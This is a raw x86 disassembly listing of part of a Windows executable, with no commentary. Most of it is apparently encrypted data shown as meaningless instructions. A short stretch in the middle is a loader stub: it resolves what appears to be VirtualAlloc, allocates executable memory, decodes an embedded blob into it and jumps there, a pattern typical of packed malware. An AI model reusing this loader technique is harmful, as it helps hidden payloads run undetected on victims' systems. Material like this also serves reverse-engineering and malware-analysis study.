  421340:	pushf  
  421341:	popa   
  421342:	xlat   BYTE PTR ds:[ebx]
  421343:	mov    esi,DWORD PTR [ecx-0x52af5e1]
  421349:	(bad)  
  42134a:	jmp    0xc3a0:0x816dfb1d
  421351:	ins    BYTE PTR es:[edi],dx
  421352:	fld    TBYTE PTR [ebx]
  421354:	mov    ds:0xc08fded0,eax
  421359:	mov    ch,0x98
  42135b:	cwde   
  42135c:	dec    edx
  42135d:	cwde   
  42135e:	leave  
  42135f:	arpl   WORD PTR [ecx-0x8],cx
  421362:	sub    BYTE PTR [edi],ah
  421364:	cmp    bh,BYTE PTR [esp+ebp*1]
  421367:	cmp    al,0x4b
  421369:	lea    ebx,[esi-0x1f]
  42136c:	sahf   
  42136d:	jmp    0x483c:0xdb7d040f
  421374:	adc    al,0x93
  421376:	and    esp,DWORD PTR [esi+ebx*1]
  421379:	test   al,0x5c
  42137b:	xchg   esi,eax
  42137c:	pusha  
  42137d:	test   al,0xfa
  42137f:	lahf   
  421380:	pop    edi
  421381:	into   
  421382:	mov    ds:0xc8d6158b,eax
  421387:	scas   eax,DWORD PTR es:[edi]
  421388:	mov    ds:0xc166d228,eax
  42138d:	pop    eax
  42138e:	or     eax,0x2467ff85
  421393:	loope  0x42134e
  421395:	fstp   DWORD PTR [eax+eiz*4]
  421398:	in     eax,dx
  421399:	add    dl,0xe1
  42139c:	outs   dx,BYTE PTR ds:[esi]
  42139d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42139e:	xor    al,0x91
  4213a0:	imul   edi,DWORD PTR [edx+0x199b8b2c],0xacea9622
  4213aa:	adc    al,0xb
  4213ac:	jge    0x4213c8
  4213ae:	add    eax,0xac63f178
  4213b3:	ds stos BYTE PTR es:[edi],al
  4213b5:	sub    edx,DWORD PTR [eax+0x272142c]
  4213bb:	cwde   
  4213bc:	and    DWORD PTR ds:0x6a008dd9,esi
  4213c2:	inc    ebp
  4213c3:	call   0x62f7:0x941879c1
  4213ca:	les    ebp,FWORD PTR [ebx+0x4aae3f07]
  4213d0:	popa   
  4213d1:	in     eax,0x3f
  4213d3:	mov    DWORD PTR [edx],esp
  4213d5:	sbb    eax,0xf5f34f96
  4213da:	das    
  4213db:	mov    dh,BYTE PTR [edx+0x7f]
  4213de:	jp     0x421444
  4213e0:	data16 cmp al,0xd6
  4213e3:	sbb    BYTE PTR [edi+ebx*4+0x57],ch
  4213e7:	(bad)  
  4213e8:	mov    esi,0x36dd7898
  4213ed:	sbb    eax,0x26e34f7e
  4213f2:	daa    
  4213f3:	pop    eax
  4213f4:	cli    
  4213f5:	cmp    ebp,DWORD PTR ds:0x388af9dd
  4213fb:	(bad)  
  4213fd:	xor    ah,BYTE PTR [ecx+0x2]
  421400:	inc    eax
  421401:	cld    
  421402:	jle    0x4213a9
  421404:	clc    
  421405:	cmc    
  421406:	xor    DWORD PTR [esp+edx*8],edi
  421409:	jns    0x4213a1
  42140b:	jmp    0x421420
  42140d:	xor    dh,BYTE PTR [esi-0x28]
  421410:	clc    
  421411:	pop    es
  421412:	inc    ebx
  421413:	sbb    al,0x7e
  421415:	or     DWORD PTR [eax+0x2c],0x95054b06
  42141c:	sub    al,0xf0
  42141e:	dec    edi
  42141f:	sub    al,0x1a
  421421:	inc    eax
  421423:	xor    al,0xd2
  421425:	ss lahf 
  421427:	mov    al,0x6c
  421429:	inc    edx
  42142a:	sbb    eax,DWORD PTR [ebp+0x58ab2025]
  421430:	retf   0x4278
  421433:	rcl    DWORD PTR [eax+0x45c38ba1],cl
  421439:	mov    ds:0xe3872a2f,eax
  42143e:	loopne 0x4213fb
  421440:	and    BYTE PTR [eax+edi*1-0x4841f350],dh
  421447:	(bad)  
  421448:	cwde   
  421449:	sbb    BYTE PTR [edx],dh
  42144b:	shr    BYTE PTR [ecx-0x62],cl
  42144e:	leave  
  42144f:	aam    0x33
  421451:	ins    WORD PTR es:[edi],dx
  421453:	sar    bh,cl
  421455:	adc    bh,BYTE PTR [ecx]
  421457:	sub    edi,DWORD PTR ds:0x7a3ac6b
  42145d:	test   DWORD PTR [edi-0x6039fa4c],0x19a05699
  421467:	xor    eax,0xb5b51fb8
  42146c:	mov    DWORD PTR [eax+edi*8],esi
  42146f:	idiv   DWORD PTR [edx-0x37]
  421472:	jne    0x4214a2
  421474:	mov    ebp,0xf4fcd4
  421479:	aam    0x1
  42147b:	aam    0xf6
  42147d:	aad    0xb7
  42147f:	and    bh,ah
  421481:	dec    esi
  421482:	retf   
  421483:	inc    edi
  421484:	jb     0x4214e9
  421486:	cmp    DWORD PTR [ebx+esi*2-0x5c],eax
  42148a:	mov    edx,0x9dc0501e
  42148f:	scas   al,BYTE PTR es:[edi]
  421490:	dec    ebp
  421491:	aaa    
  421492:	int3   
  421493:	inc    ebp
  421494:	mov    edi,0x1879b8c
  421499:	pop    ebx
  42149a:	imul   esp,ebx,0x6ce5ca93
  4214a0:	jmp    0x6702:0x190341f6
  4214a7:	mul    DWORD PTR [ecx]
  4214a9:	pop    ebp
  4214aa:	pop    es
  4214ab:	mov    edi,0xb292bf30
  4214b0:	data16 xlat BYTE PTR ds:[ebx]
  4214b2:	in     al,0xa
  4214b4:	mov    WORD PTR [ecx-0x26],fs
  4214b7:	jne    0x4214af
  4214b9:	dec    edi
  4214ba:	lods   al,BYTE PTR ds:[esi]
  4214bb:	xor    al,0xe6
  4214bd:	ficomp WORD PTR [esi]
  4214bf:	aam    0xb5
  4214c1:	shl    DWORD PTR [ebp-0x29],cl
  4214c4:	inc    DWORD PTR [ebp+0x33b77559]
  4214ca:	rol    bl,0x90
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428100
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x428104
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428108
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x42810c
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f0
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280f4
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x4280f8
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x4280fc
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x4280fe
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	cmp    DWORD PTR [ebp+0x8],0x0
  421630:	jne    0x42163b
  421632:	mov    eax,DWORD PTR [ebp-0x10]
  421635:	add    eax,0x1
  421638:	mov    DWORD PTR [ebp-0x10],eax
  42163b:	mov    DWORD PTR [ebp-0x48],0x0
  421642:	mov    DWORD PTR [ebp-0x4c],0x0
  421649:	push   0x1
  42164b:	lea    ecx,[ebp-0x14]
  42164e:	push   ecx
  42164f:	call   DWORD PTR ds:0x428000
  421655:	mov    BYTE PTR [ebp-0x40],0x56
  421659:	call   DWORD PTR ds:0x428010
  42165f:	mov    DWORD PTR [ebp-0x2c],eax
  421662:	mov    BYTE PTR [ebp-0x3e],0x72
  421666:	movzx  edx,WORD PTR [ebp-0x2c]
  42166a:	test   edx,edx
  42166c:	jne    0x4216ae
  42166e:	mov    BYTE PTR [ebp-0x34],0x0
  421672:	mov    DWORD PTR [ebp-0x14],0xe0d
  421679:	lea    eax,[ebp-0x28]
  42167c:	push   eax
  42167d:	call   DWORD PTR ds:0x428014
  421683:	mov    DWORD PTR [ebp-0x68],eax
  421686:	mov    DWORD PTR [ebp-0x5c],0x3a
  42168d:	lea    ecx,[ebp-0x40]
  421690:	push   ecx
  421691:	mov    edx,DWORD PTR [ebp-0x68]
  421694:	push   edx
  421695:	call   DWORD PTR ds:0x428018
  42169b:	mov    DWORD PTR [ebp-0x44],eax
  42169e:	mov    DWORD PTR [ebp-0x8],0xe6379c72
  4216a5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216ac:	jmp    0x4216c3
  4216ae:	mov    BYTE PTR ds:0x443a58,0x0
  4216b5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216bc:	mov    BYTE PTR ds:0x441b18,0x0
  4216c3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216ca:	push   DWORD PTR ds:0x428014
  4216d0:	pop    edx
  4216d1:	mov    DWORD PTR [ebp-0x74],edx
  4216d4:	push   DWORD PTR [ebp-0x30]
  4216d7:	push   0x1000
  4216dc:	mov    eax,DWORD PTR [ebp-0x14]
  4216df:	add    eax,0x23
  4216e2:	add    eax,0x23
  4216e5:	push   eax
  4216e6:	xor    eax,eax
  4216e8:	push   eax
  4216e9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216ec:	call   ecx
  4216ee:	mov    edx,eax
  4216f0:	mov    DWORD PTR [ebp-0x4],edx
  4216f3:	mov    eax,DWORD PTR [ebp-0x70]
  4216f6:	sub    eax,0xdae0b
  4216fb:	mov    DWORD PTR [ebp-0x70],eax
  4216fe:	cmp    DWORD PTR [ebp-0x4],0x0
  421702:	jne    0x42170b
  421704:	mov    BYTE PTR ds:0x441b18,0x0
  42170b:	mov    ecx,DWORD PTR [ebp-0x4]
  42170e:	add    ecx,DWORD PTR [ebp-0x14]
  421711:	mov    edx,DWORD PTR [ebp-0x8]
  421714:	mov    DWORD PTR [ecx],edx
  421716:	mov    eax,DWORD PTR [ebp-0x4]
  421719:	add    eax,DWORD PTR [ebp-0x5c]
  42171c:	mov    DWORD PTR [ebp-0x64],eax
  42171f:	mov    ecx,DWORD PTR ds:0x428018
  421725:	mov    DWORD PTR [ebp-0x54],ecx
  421728:	mov    edx,DWORD PTR [ebp-0x4]
  42172b:	add    edx,DWORD PTR [ebp-0x14]
  42172e:	mov    eax,DWORD PTR [ebp+0x8]
  421731:	mov    DWORD PTR [edx+0x4],eax
  421734:	mov    ecx,DWORD PTR [ebp-0x4]
  421737:	add    ecx,DWORD PTR [ebp-0x14]
  42173a:	mov    DWORD PTR [ebp-0xc],ecx
  42173d:	cmp    DWORD PTR [ebp-0x70],0x0
  421741:	jbe    0x42175e
  421743:	mov    edx,DWORD PTR [ebp-0xc]
  421746:	push   edx
  421747:	mov    eax,DWORD PTR [ebp-0x14]
  42174a:	push   eax
  42174b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42174e:	add    ecx,DWORD PTR [ebp-0x70]
  421751:	push   ecx
  421752:	mov    edx,DWORD PTR [ebp-0x4]
  421755:	push   edx
  421756:	call   0x4214d0
  42175b:	add    esp,0x10
  42175e:	cmp    DWORD PTR [ebp-0x64],0x0
  421762:	je     0x421776
  421764:	mov    ecx,DWORD PTR [ebp-0x54]
  421767:	push   ecx
  421768:	push   DWORD PTR [ebp-0x74]
  42176b:	mov    esi,DWORD PTR [ebp-0x64]
  42176e:	push   edx
  42176f:	pop    eax
  421770:	push   ecx
  421771:	nop
  421772:	jmp    esi
  421774:	jmp    0x42177c
  421776:	mov    eax,DWORD PTR [ebp+0x8]
  421779:	mov    DWORD PTR [ebp-0x18],eax
  42177c:	mov    eax,0x1
  421781:	pop    esi
  421782:	mov    esp,ebp
  421784:	pop    ebp
  421785:	ret    
  421786:	int3   
  421787:	int3   
  421788:	int3   
  421789:	int3   
  42178a:	int3   
  42178b:	int3   
  42178c:	int3   
  42178d:	int3   
  42178e:	int3   
  42178f:	int3   
  421790:	push   ebp
  421791:	mov    ebp,esp
  421793:	sub    esp,0x18
  421796:	lea    eax,[ebp-0x18]
  421799:	push   eax
  42179a:	call   DWORD PTR ds:0x42800c
  4217a0:	cmp    WORD PTR [ebp-0x18],0x0
  4217a5:	je     0x4217e8
  4217a7:	mov    ecx,DWORD PTR ds:0x428010
  4217ad:	push   0x0
  4217af:	push   0xb2
  4217b4:	push   0x82
  4217b9:	push   0x0
  4217bb:	mov    DWORD PTR [ebp-0x4],ecx
  4217be:	call   DWORD PTR ds:0x428008
  4217c4:	push   DWORD PTR [ebp-0x4]
  4217c7:	pop    edx
  4217c8:	call   edx
  4217ca:	push   eax
  4217cb:	pop    DWORD PTR [ebp-0x8]
  4217ce:	push   0xd97e8ad2
  4217d3:	call   0x421550
  4217d8:	add    esp,0x4
  4217db:	call   0x411000
  4217e0:	xor    eax,eax
  4217e2:	mov    esp,ebp
  4217e4:	pop    ebp
  4217e5:	ret    0x10
  4217e8:	push   DWORD PTR [edx-0x345c199f]
  4217ee:	cmp    eax,0x882632bd
  4217f3:	stos   DWORD PTR es:[edi],eax
  4217f4:	xlat   BYTE PTR ds:[ebx]
  4217f5:	jmp    0x1bb852fa
  4217fa:	enter  0xbd3d,0x32
  4217fe:	and    cl,BYTE PTR [eax-0xe96855]
  421804:	cmp    esi,DWORD PTR [esi-0x5d]
  421807:	enter  0xbd3d,0x32
  42180b:	and    cl,BYTE PTR [eax-0xe92855]
  421811:	cmp    esi,DWORD PTR [esi-0x5d]
  421814:	enter  0xbd3d,0x32
  421818:	and    cl,BYTE PTR [eax-0xe92855]
  42181e:	cmp    esi,DWORD PTR [esi-0x5d]
  421821:	enter  0xbd3d,0x32
  421825:	fimul  DWORD PTR [eax-0x1fe72855]
  42182b:	cmp    DWORD PTR [eax-0x5d],0x1370347c
  421832:	call   0x53ab:0x371ae789
  421839:	pop    ds
  42183a:	shr    al,1
  42183c:	dec    ebp
  42183d:	iret   
  42183e:	pop    ebp
  42183f:	inc    ebp
  421840:	cli    
  421841:	retf   0x36ba
  421844:	pushf  
  421845:	pop    edx
  421846:	sbb    ch,cl
  421848:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421849:	dec    ecx
  42184a:	popf   
  42184b:	push   eax
  42184c:	inc    edi
  42184d:	test   al,0xd9
  42184f:	mov    ds:0x1852df78,al
  421854:	or     DWORD PTR [edx+esi*2-0x18b0ed12],0xffffffcf
  42185c:	mov    dl,0x38
  42185e:	bnd ss jl 0x4217e9
  421862:	enter  0xbd3d,0x32
  421866:	and    cl,BYTE PTR [eax+0x38fd0ab]
  42186c:	bound  esi,QWORD PTR ds:0xfe375a5b
  421872:	retf   0x82b0
  421875:	call   0x64379ca9
  42187a:	adc    ebp,DWORD PTR [edi-0x5fba9d3e]
  421880:	sub    al,dl
  421882:	into   
  421883:	out    dx,eax
  421884:	sbb    al,0x3d
  421886:	ret    
  421887:	in     al,0xa9
  421889:	nop
  42188a:	pop    eax
  42188b:	test   BYTE PTR [eax],bh
  42188d:	dec    edx
  42188e:	jo     0x4218c9
  421890:	fnstsw WORD PTR [edx]
  421892:	jno    0x421896
  421894:	jl     0x42187b
  421896:	xor    BYTE PTR [edi-0x665d8749],ch
  42189c:	mov    eax,ds:0x316dee9d
  4218a1:	cmp    al,0x23
  4218a3:	leave  
  4218a4:	aaa    
  4218a5:	in     eax,0xca
  4218a7:	mov    al,0x82
  4218a9:	call   0x14379ddd
  4218ae:	(bad)  
  4218af:	xor    edx,eax
  4218b1:	and    BYTE PTR [ebp-0x4e],0x28
  4218b5:	lds    edx,FWORD PTR [ebx+0x45]
  4218b8:	sbb    al,0xa7
  4218ba:	pop    esi
  4218bb:	dec    ebx
  4218bc:	test   eax,0x382fc5c0
  4218c1:	jp     0x4218b0
  4218c3:	mov    ds:0xa90754dd,eax
  4218c8:	jl     0x4218c5
  4218ca:	lods   eax,DWORD PTR ds:[esi]
  4218cb:	xor    dh,BYTE PTR [edi-0x5ee52590]
  4218d1:	test   DWORD PTR [edi-0x64],edi
  4218d4:	push   ebx
  4218d5:	xor    eax,0xbd375a5b
  4218da:	xor    ah,BYTE PTR [edx]
  4218dc:	mov    BYTE PTR [ebx+0x6bff16d7],ch
  4218e2:	xor    esp,DWORD PTR [ebx+0x30bc71c8]
  4218e8:	and    ch,BYTE PTR [eax]
  4218ea:	jnp    0x4218a8
  4218ec:	pop    ecx
  4218ed:	(bad)  
  4218ee:	cmp    esi,DWORD PTR [esi-0x5d]
  4218f1:	enter  0xbd3d,0x32
  4218f5:	ret    0xa888
  4218f8:	(bad)  
  4218f9:	sbb    eax,0xa37631fe
  4218fe:	cmp    DWORD PTR es:[ebp-0x547161ce],edi
  421905:	xlat   BYTE PTR ds:[ebx]
  421906:	push   ss
  421907:	(bad)  
  421908:	cmp    esp,DWORD PTR [edi+0x1e]
  42190b:	enter  0xbd3d,0x22
  42190f:	and    cl,BYTE PTR [eax-0xec2855]
  421915:	cmp    esi,DWORD PTR [esi-0x1e]
  421918:	enter  0xad3d,0x32
  42191c:	and    cl,BYTE PTR [eax-0x5e92857]
  421922:	cmp    esi,DWORD PTR [edi-0x5d]
  421925:	enter  0xbd3d,0x32
  421929:	daa    
  42192a:	mov    BYTE PTR [edx+0x3bff16d7],ch
  421930:	jbe    0x4218d5
  421932:	cwde   
  421933:	xor    DWORD PTR [ebp-0x5477d9ce],edi
  421939:	(bad)  
  42193a:	repnz cli 
  42193c:	cmp    esi,DWORD PTR [ebx+eiz*4-0x38]
  421940:	mov    ebp,0x883232bd
  421945:	stos   DWORD PTR es:[edi],eax
  421946:	(bad)  
  421947:	push   ss
  421948:	(bad)  
  421949:	cmp    esi,DWORD PTR [esi-0x4d]
  42194c:	enter  0xad3d,0x32
  421950:	and    cl,BYTE PTR [eax-0x10e92855]
  421956:	cmp    esi,DWORD PTR [esi-0x5d]
  421959:	enter  0xbd3d,0x32
  42195d:	and    cl,BYTE PTR [eax-0x391d2855]
  421963:	aaa    
  421964:	jbe    0x421930
  421966:	retf   
  421967:	cmp    eax,0x83d232bd
  42196c:	stos   DWORD PTR es:[edi],eax
  42196d:	cwde   
  42196e:	pop    edi
  42196f:	(bad)  
  421970:	cmp    esi,DWORD PTR [esi-0x5d]
  421973:	enter  0xbd3d,0x32
  421977:	and    cl,BYTE PTR [eax-0xe92855]
  42197d:	cmp    esi,DWORD PTR [esi-0x5d]
  421980:	enter  0xbd3d,0x32
  421984:	and    cl,BYTE PTR [eax-0xe92855]
  42198a:	cmp    esi,DWORD PTR [esi-0x5d]
  42198d:	enter  0xbd3d,0x32
  421991:	and    cl,BYTE PTR [eax-0xe92855]
  421997:	cmp    esi,DWORD PTR [esi-0x5d]
  42199a:	enter  0xbd3d,0x32
  42199e:	and    cl,BYTE PTR [eax-0xe92855]
  4219a4:	cmp    esi,DWORD PTR [esi-0x5d]
  4219a7:	enter  0xbd3d,0x32
  4219ab:	and    cl,BYTE PTR [eax-0xe92855]
  4219b1:	cmp    esi,DWORD PTR [esi-0x5d]
  4219b4:	enter  0xbd3d,0x32
  4219b8:	and    cl,BYTE PTR [eax-0xe92855]
  4219be:	cmp    esi,DWORD PTR [esi-0x5d]
  4219c1:	enter  0xbd3d,0x32
  4219c5:	and    cl,BYTE PTR [eax-0xe92855]
  4219cb:	cmp    esi,DWORD PTR [esi-0x5d]
  4219ce:	enter  0xbd3d,0x32
  4219d2:	and    cl,BYTE PTR [eax-0xe92855]
  4219d8:	cmp    ebx,DWORD PTR [eax-0x29]
  4219db:	lods   eax,DWORD PTR ds:[esi]
  4219dc:	inc    ebp
  4219dd:	leave  
  4219de:	xor    ah,BYTE PTR [edx]
  4219e0:	mov    BYTE PTR [ebx+0x3bff1d37],ch
  4219e6:	mov    ds:0x36693dc8,ax
  4219ec:	and    cl,BYTE PTR [eax-0x50e92851]
  4219f2:	jle    0x421a29
  4219f4:	xchg   ecx,eax
  4219f5:	pushf  
  4219f6:	jb     0x4219b5
  4219f8:	xor    ah,BYTE PTR [edx]
  4219fa:	mov    BYTE PTR [ebx+0x3bff36d7],ch
  421a00:	xchg   esi,eax
  421a01:	lea    edi,[edx+0x2251cf4e]
  421a07:	mov    BYTE PTR [ebx+0x3bff76d7],ch
  421a0d:	jbe    0x421a62
  421a0f:	ret    
  421a10:	cmp    eax,0x882268bd
  421a15:	stos   DWORD PTR es:[edi],eax
  421a16:	movhlps xmm7,xmm7
  421a19:	cmp    esi,DWORD PTR [esi-0x5d]
  421a1c:	enter  0xbd3d,0x32
  421a20:	and    cl,BYTE PTR [eax-0x20e92855]
  421a26:	cmp    esi,DWORD PTR [esi+0x43]
  421a29:	enter  0xbd3d,0x32
  421a2d:	and    cl,BYTE PTR [eax-0xe92855]
  421a33:	cmp    esi,DWORD PTR [esi-0x5d]
  421a36:	enter  0xbd3d,0x32
  421a3a:	and    cl,BYTE PTR [eax-0xe92855]
  421a40:	cmp    esi,DWORD PTR [esi-0x5d]
  421a43:	enter  0xbd3d,0x32
  421a47:	and    cl,BYTE PTR [eax-0xe92855]
  421a4d:	cmp    esi,DWORD PTR [esi-0x5d]
  421a50:	enter  0xbd3d,0x32
  421a54:	and    cl,BYTE PTR [eax-0xe92855]
  421a5a:	cmp    esi,DWORD PTR [esi-0x5d]
  421a5d:	enter  0xbd3d,0x32
  421a61:	and    cl,BYTE PTR [eax-0xe92855]
  421a67:	cmp    esi,DWORD PTR [esi-0x5d]
  421a6a:	enter  0xbd3d,0x32
  421a6e:	and    cl,BYTE PTR [eax-0xe92855]
  421a74:	cmp    esi,DWORD PTR [esi-0x5d]
  421a77:	enter  0xbd3d,0x32
  421a7b:	and    cl,BYTE PTR [eax-0xe92855]
  421a81:	cmp    esi,DWORD PTR [esi-0x5d]
  421a84:	enter  0xbd3d,0x32
  421a88:	and    cl,BYTE PTR [eax-0xe92855]
  421a8e:	cmp    esi,DWORD PTR [esi-0x5d]
  421a91:	enter  0xbd3d,0x32
  421a95:	and    cl,BYTE PTR [eax-0xe92855]
  421a9b:	cmp    esi,DWORD PTR [esi-0x5d]
  421a9e:	enter  0xbd3d,0x32
  421aa2:	and    cl,BYTE PTR [eax-0xe92855]
  421aa8:	cmp    esi,DWORD PTR [esi-0x5d]
  421aab:	enter  0xbd3d,0x32
  421aaf:	and    cl,BYTE PTR [eax-0xe92855]
  421ab5:	cmp    esi,DWORD PTR [esi-0x5d]
  421ab8:	enter  0xbd3d,0x32
  421abc:	and    cl,BYTE PTR [eax-0xe92855]
  421ac2:	cmp    esi,DWORD PTR [esi-0x5d]
  421ac5:	enter  0xbd3d,0x32
  421ac9:	and    cl,BYTE PTR [eax-0xe92855]
  421acf:	cmp    esi,DWORD PTR [esi-0x5d]
  421ad2:	enter  0xbd3d,0x32
  421ad6:	and    cl,BYTE PTR [eax-0xe92855]
  421adc:	cmp    esi,DWORD PTR [esi-0x5d]
  421adf:	enter  0xbd3d,0x32
  421ae3:	and    cl,BYTE PTR [eax-0xe92855]
  421ae9:	cmp    esi,DWORD PTR [esi-0x5d]
  421aec:	enter  0xbd3d,0x32
  421af0:	and    cl,BYTE PTR [eax-0xe92855]
  421af6:	cmp    esi,DWORD PTR [esi-0x5d]
  421af9:	enter  0xbd3d,0x32
  421afd:	and    cl,BYTE PTR [eax-0xe92855]
  421b03:	cmp    esi,DWORD PTR [esi-0x5d]
  421b06:	enter  0xbd3d,0x32
  421b0a:	and    cl,BYTE PTR [eax-0xe92855]
  421b10:	cmp    esi,DWORD PTR [esi-0x5d]
  421b13:	enter  0xbd3d,0x32
  421b17:	and    cl,BYTE PTR [eax-0xe92855]
  421b1d:	cmp    esi,DWORD PTR [esi-0x5d]
  421b20:	enter  0xbd3d,0x32
  421b24:	and    cl,BYTE PTR [eax-0xe92855]
  421b2a:	cmp    esi,DWORD PTR [esi-0x5d]
  421b2d:	enter  0xbd3d,0x32
  421b31:	and    cl,BYTE PTR [eax-0xe92855]
  421b37:	cmp    esi,DWORD PTR [esi-0x5d]
  421b3a:	enter  0xbd3d,0x32
  421b3e:	and    cl,BYTE PTR [eax-0xe92855]
  421b44:	cmp    esi,DWORD PTR [esi-0x5d]
  421b47:	enter  0xbd3d,0x32
  421b4b:	and    cl,BYTE PTR [eax-0xe92855]
  421b51:	cmp    esi,DWORD PTR [esi-0x5d]
  421b54:	enter  0xbd3d,0x32
  421b58:	and    cl,BYTE PTR [eax-0xe92855]
  421b5e:	cmp    esi,DWORD PTR [esi-0x5d]
  421b61:	enter  0xbd3d,0x32
  421b65:	and    cl,BYTE PTR [eax-0xe92855]
  421b6b:	cmp    esi,DWORD PTR [esi-0x5d]
  421b6e:	enter  0xbd3d,0x32
  421b72:	and    cl,BYTE PTR [eax-0xe92855]
  421b78:	cmp    esi,DWORD PTR [esi-0x5d]
  421b7b:	enter  0xbd3d,0x32
  421b7f:	and    cl,BYTE PTR [eax-0xe92855]
  421b85:	cmp    esi,DWORD PTR [esi-0x5d]
  421b88:	enter  0xbd3d,0x32
  421b8c:	and    cl,BYTE PTR [eax-0xe92855]
  421b92:	cmp    esi,DWORD PTR [esi-0x5d]
  421b95:	enter  0xbd3d,0x32
  421b99:	and    cl,BYTE PTR [eax-0xe92855]
  421b9f:	cmp    esi,DWORD PTR [esi-0x5d]
  421ba2:	enter  0xbd3d,0x32
  421ba6:	and    cl,BYTE PTR [eax-0xe92855]
  421bac:	cmp    esi,DWORD PTR [esi-0x5d]
  421baf:	enter  0xbd3d,0x32
  421bb3:	and    cl,BYTE PTR [eax-0xe92855]
  421bb9:	cmp    esi,DWORD PTR [esi-0x5d]
  421bbc:	enter  0xbd3d,0x32
  421bc0:	and    cl,BYTE PTR [eax-0xe92855]
  421bc6:	cmp    esi,DWORD PTR [esi-0x5d]
  421bc9:	enter  0xbd3d,0x32
  421bcd:	and    cl,BYTE PTR [eax-0xe92855]
  421bd3:	cmp    esi,DWORD PTR [esi-0x5d]
  421bd6:	enter  0xbd3d,0x32
  421bda:	and    cl,BYTE PTR [eax-0xe92855]
  421be0:	cmp    esi,DWORD PTR [esi-0x5d]
  421be3:	enter  0xbd3d,0x32
  421be7:	and    cl,BYTE PTR [eax-0xe2803c]
  421bed:	adc    al,0x76
  421bef:	mov    ds:0x18bd3dd8,eax
  421bf4:	adc    BYTE PTR [edx-0x26],0xb1
  421bf8:	jmp    0xf433c1cf
  421bfd:	and    eax,0x9621550b
  421c02:	sbb    eax,0xa592a6cd
  421c07:	sub    bh,al
  421c09:	adc    al,0xde
  421c0b:	push   eax
  421c0c:	pop    ecx
  421c0d:	mov    eax,0xb5854ea3
  421c12:	xchg   al,al
  421c14:	add    al,BYTE PTR [ebp-0x14]
  421c17:	jns    0x421c43
  421c19:	lahf   
  421c1a:	xor    al,BYTE PTR ds:0x4782232f
  421c20:	xchg   edx,eax
  421c21:	xchg   edx,eax
  421c22:	inc    esp
  421c23:	sahf   
  421c24:	adc    eax,0x2d520c29
  421c29:	push   esi
  421c2a:	(bad)  
  421c2b:	ins    BYTE PTR es:[edi],dx
  421c2c:	pop    edx
  421c2d:	sub    al,0xfe
  421c2f:	pop    ecx
  421c30:	pop    ebx
  421c31:	push   esi
